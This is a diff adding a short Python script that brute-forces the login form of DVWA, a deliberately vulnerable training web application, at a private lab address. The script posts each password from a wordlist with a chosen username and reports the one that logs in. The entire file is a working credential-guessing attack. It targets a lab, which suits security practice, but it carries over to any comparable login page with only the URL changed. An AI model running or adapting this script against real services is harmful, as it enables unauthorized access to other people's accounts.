@@ -1,0 +1,20 @@
+import requests
+import time
+
+url = 'http://192.168.1.9/dvwa/login.php'
+
+req = open('WordsList.txt.txt', 'r').readlines()
+
+username = input('Type the user name you want to try ==> ')
+
+for line in req:
+    password = line.strip()
+    http = requests.post(url, data={'username':username,'password': password ,'Login':'Login'})
+    content = http.text
+
+    time.sleep(0.3)
+    if 'logged in' in content:
+        print ("============ [+] PASSWORD CRACKED :", password,'============')
+        break
+    else:
+        print ("[-]invalid password :", password)
